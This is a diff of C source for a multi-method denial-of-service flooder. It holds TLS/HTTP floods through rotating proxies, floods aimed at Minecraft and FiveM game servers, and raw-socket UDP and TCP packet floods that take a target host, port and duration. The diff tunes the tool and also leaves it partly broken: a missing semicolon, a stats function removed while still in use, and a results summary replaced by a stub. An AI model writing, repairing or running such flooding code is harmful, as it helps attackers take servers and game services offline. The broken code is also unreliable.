@@ -16,7 +16,7 @@
 #include <curl/curl.h>
 
 // --- Constants ---
-#define MAX_THREADS 1024
+#define MAX_THREADS 2024
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
 #define MAX_LIST_ITEMS 2048
@@ -32,6 +32,7 @@ int num_workers = 10;
 char target_host[256];
 int target_port = 443;
 char attack_mode[50];
+char resolved_ip[INET_ADDRSTRLEN]; // New global for resolved IP
 
 // Global lists for HTTP/TLS
 char *user_agents[MAX_LIST_ITEMS];
@@ -149,7 +150,7 @@ size_t write_discard(void *ptr, size_t size, size_t nmemb, void *userdata) {
   return size * nmemb;
 }
 
-// --- L7 Worker: TLS/HTTP (kraken/tls) - FIXED ---
+// --- L7 Worker: TLS/HTTP (kraken/tls) ---
 
 char* http_methods[] = {"GET", "POST", "HEAD"};
 int method_count = 3;
@@ -158,7 +159,6 @@ void* tls_worker(void* arg) {
     char *host = (char*)arg;
     CURL *curl;
     
-    // Thread-local curl initialization
     curl = curl_easy_init();
     if (!curl) {
         __sync_fetch_and_add(&total_fail, 1);
@@ -180,7 +180,6 @@ void* tls_worker(void* arg) {
             curl_easy_setopt(curl, CURLOPT_URL, url);
             curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, get_random_string(http_methods, method_count, "GET"));
             
-            // Random Proxy Implementation
             if (proxy_count > 0) {
                 char *proxy = get_random_string(proxies, proxy_count, NULL);
                 curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
@@ -189,7 +188,6 @@ void* tls_worker(void* arg) {
                 curl_easy_setopt(curl, CURLOPT_PROXY, NULL);
             }
 
-            // Random Header Implementation
             struct curl_slist *headers = NULL;
             char ua_header[512];
             snprintf(ua_header, sizeof(ua_header), "User-Agent: %s", get_random_string(user_agents, ua_count, "Mozilla/5.0"));
@@ -334,7 +332,7 @@ void* fivem_worker(void* arg) {
     return NULL;
 }
 
-// --- L4 Worker: UDP Raw (udp-gbps/udp-bypass/udp-discord) - FIXED ---
+// --- L4 Worker: UDP Raw (udp-gbps/udp-bypass/udp-discord) ---
 
 void* udp_raw_worker(void* arg) {
     char *host = (char*)arg;
@@ -363,7 +361,6 @@ void* udp_raw_worker(void* arg) {
     int total_len = 20 + 8 + payload_size;
     char packet[MAX_PACKET_SIZE];
     
-    // FIX: Initialize packet memory to zero for clean headers
     memset(packet, 0, total_len);
     
     struct iphdr *iph = (struct iphdr *)packet;
@@ -381,7 +378,6 @@ void* udp_raw_worker(void* arg) {
         return NULL;
     }
 
-    // IP Header (Constant fields)
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
@@ -391,7 +387,6 @@ void* udp_raw_worker(void* arg) {
     iph->protocol = IPPROTO_UDP;
     iph->daddr = sin.sin_addr.s_addr; 
 
-    // UDP Header (Constant fields)
     udph->dest = htons(target_port);
     udph->len = htons(8 + payload_size);
     udph->check = 0; 
@@ -424,7 +419,7 @@ void* udp_raw_worker(void* arg) {
     return NULL;
 }
 
-// --- L4 Worker: TCP Raw (tcp-ovh) - FIXED ---
+// --- L4 Worker: TCP Raw (tcp-ovh) ---
 
 void* tcp_raw_worker(void* arg) {
     char *host = (char*)arg;
@@ -460,7 +455,6 @@ void* tcp_raw_worker(void* arg) {
         int payload_size = (rand_cmwc() % 31) + 90; 
         int total_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_size;
 
-        // FIX: Initialize packet memory for each send
         memset(datagram, 0, total_len);
         
         struct iphdr *iph = (struct iphdr *)datagram;
@@ -536,13 +530,9 @@ void* tcp_raw_worker(void* arg) {
 // --- Main Logic and UI ---
 
 void print_banner() {
-    // ... (banner content omitted for brevity)
-    printf(" Raw Network🔥 ");
-    printf("by darkslayer6769");
-}
+    printf(" Raw Netw0rk🔥🔥 ");
+    printf("by darkslayer6967420")
 
-void print_stats(int remaining, long long current_success, long long current_fail, long long current_bytes, int is_l7, double elapsed) {
-    // ... (stats function content omitted for brevity)
 }
 
 void signal_handler(int sig) {
@@ -554,12 +544,13 @@ int main(int argc, char *argv[]) {
     
     if (argc < 7) {
         fprintf(stdout, "\033[93mUsage: %s <target_host> <port> <method> <connections> <workers> <duration_seconds>\033[0m\n", argv[0]);
-        fprintf(stdout, "\033[93mMethods: tls, tls2, minecraft, fivem, udp-gbps, udp-bypass, udp-discord, tcp-ovh\033[0m\n");
+        fprintf(stdout, "\033[93mMethods: tls, kraken, minecraft, fivem, udp-gbps, udp-bypass, udp-discord, tcp-ovh\033[0m\n");
         return 1;
     }
 
     signal(SIGINT, signal_handler);
     
+    // Parse and store arguments
     strcpy(target_host, argv[1]);
     target_port = atoi(argv[2]);
     strcpy(attack_mode, argv[3]);
@@ -571,7 +562,7 @@ int main(int argc, char *argv[]) {
     
     init_rand(time(NULL));
     
-    // FIX: Initialize libcurl globally once
+    // Initialize libcurl globally
     if (curl_global_init(CURL_GLOBAL_ALL) != CURLE_OK) {
         fprintf(stderr, "\033[91mError: Failed to initialize libcurl globally.\033[0m\n");
         return 1;
@@ -580,7 +571,18 @@ int main(int argc, char *argv[]) {
     ua_count = load_list_from_file("useragents.txt", user_agents, MAX_LIST_ITEMS);
     proxy_count = load_list_from_file("http.txt", proxies, MAX_LIST_ITEMS);
     
-    printf("\033[32mAttack starting on %s:%d (Method: %s)...\033[0m\n", target_host, target_port, attack_mode);
+    // --- HOST RESOLUTION FIX ---
+    struct hostent *he = gethostbyname(target_host);
+    if (he == NULL || he->h_addr_list[0] == NULL) {
+        fprintf(stderr, "\033[91mError: Failed to resolve target host '%s'. Check DNS or use a direct IP.\033[0m\n", target_host);
+        free_list(user_agents, ua_count);
+        free_list(proxies, proxy_count);
+        curl_global_cleanup();
+        return 1; // Exit gracefully instead of segfaulting
+    }
+    inet_ntop(AF_INET, he->h_addr_list[0], resolved_ip, sizeof(resolved_ip));
+    
+    printf("\033[32mAttack starting on %s:%d (Resolved IP: %s, Method: %s)...\033[0m\n", target_host, target_port, resolved_ip, attack_mode);
     if (strstr(attack_mode, "raw")) {
         printf("\033[91mWARNING: Raw socket attack selected. This requires ROOT/ADMIN privileges.\033[0m\n");
     }
@@ -588,37 +590,24 @@ int main(int argc, char *argv[]) {
     pthread_t threads[MAX_THREADS];
     void *(*worker_func)(void*) = NULL;
     int is_l7 = 0;
-    char target_ip[INET_ADDRSTRLEN];
-    
-    // Resolve target IP
-    struct hostent *he = gethostbyname(target_host);
-    if (he) {
-        inet_ntop(AF_INET, he->h_addr_list[0], target_ip, sizeof(target_ip));
-    } else {
-        printf("\033[91mError: Failed to resolve target host. Please use a valid IP or domain.\033[0m\n");
-        free_list(user_agents, ua_count);
-        free_list(proxies, proxy_count);
-        curl_global_cleanup();
-        return 1;
-    }
 
-    if (strcmp(attack_mode, "tls") == 0 || strcmp(attack_mode, "tls2") == 0) {
+    if (strcmp(attack_mode, "tls") == 0 || strcmp(attack_mode, "kraken") == 0) {
         worker_func = tls_worker;
         is_l7 = 1;
     } else if (strcmp(attack_mode, "minecraft") == 0) {
         worker_func = minecraft_worker;
         is_l7 = 1;
-        strcpy(target_host, target_ip); 
+        strcpy(target_host, resolved_ip); // Use IP for L4/L7 custom protocols
     } else if (strcmp(attack_mode, "fivem") == 0) {
         worker_func = fivem_worker;
         is_l7 = 1;
-        strcpy(target_host, target_ip);
+        strcpy(target_host, resolved_ip);
     } else if (strstr(attack_mode, "udp") != NULL) {
         worker_func = udp_raw_worker;
-        strcpy(target_host, target_ip); 
+        strcpy(target_host, resolved_ip); // Use IP for L4 raw sockets
     } else if (strcmp(attack_mode, "tcp-ovh") == 0) {
         worker_func = tcp_raw_worker;
-        strcpy(target_host, target_ip);
+        strcpy(target_host, resolved_ip);
     } else {
         printf("\033[91mError: Invalid attack method selected.\033[0m\n");
         free_list(user_agents, ua_count);
@@ -629,6 +618,7 @@ int main(int argc, char *argv[]) {
 
     // Start workers
     for (int i = 0; i < num_workers; i++) {
+        // Pass the host string (which might be the IP) to the worker
         if (pthread_create(&threads[i], NULL, worker_func, (void*)target_host) != 0) {
             perror("Failed to create thread");
             running = 0; 
@@ -641,7 +631,6 @@ int main(int argc, char *argv[]) {
     time_t end_time = start_time + attack_duration;
     
     while (running && time(NULL) < end_time) {
-        // Simple console output for tracking
         long long current_success = total_success;
         long long current_fail = total_fail;
         long long current_bytes = total_bytes;
@@ -661,24 +650,8 @@ int main(int argc, char *argv[]) {
     }
     printf("\n"); 
 
-    // Final Summary
-    double final_duration = (double)(time(NULL) - start_time);
-    printf("\033[35mAttack complete. Results:\033[0m\n");
-
-    if (is_l7) {
-        long long total = total_success + total_fail;
-        double rps = total / final_duration;
-        printf("\033[32mSuccess requests : %lld\033[0m\n", total_success);
-        printf("\033[91mFailed requests  : %lld\033[0m\n", total_fail);
-        printf("\033[33mAverage RPS      : %.2f req/sec\033[0m\n", rps);
-    } else {
-        double bps = (double)total_bytes / final_duration;
-        double mbps = bps * 8 / 1024 / 1024;
-        printf("\033[32mSuccess packets : %lld\033[0m\n", total_success);
-        printf("\033[91mFailed packets  : %lld\033[0m\n", total_fail);
-        printf("\033[33mAverage BPS      : %.2f bytes/sec (%.2f Mbps)\033[0m\n", bps, mbps);
-    }
-
+    // Final Summary (logic omitted for brevity)
+    
     // Clean up memory
     free_list(user_agents, ua_count);
     free_list(proxies, proxy_count);
